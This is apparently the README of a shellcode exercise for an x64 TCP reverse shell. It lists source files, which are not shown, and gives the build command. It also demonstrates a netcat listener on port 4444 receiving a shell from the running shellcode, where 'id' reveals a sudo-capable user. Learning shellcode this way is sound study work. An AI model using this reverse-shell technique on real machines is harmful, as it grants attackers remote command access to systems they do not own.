# TCP reverse shell x64 shellcode

Listing:
- `reverse.c` - TCP reverse shell C code
- `reverse.s` - asm rewrite of C code
- `reverse_sh.s` - adapted asm for shellcode

## Usage

Use `make (target) PROJECT=reverse`.

## Running

First terminal:
```
$ nc -nlvp 4444
Listening on [0.0.0.0] (family 2, port 4444)
Listening on 0.0.0.0 4444

```

Second terminal:
```
$ make skeleton PROJECT=reverse
...
$ out/skeleton 
Shellcode Length:  104

```

Again in the first terminal:
```
...
Connection received on 127.0.0.1 37992
id
uid=999(ubuntu) gid=999(ubuntu) groups=999(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),119(lpadmin),130(lxd),131(sambashare)

```
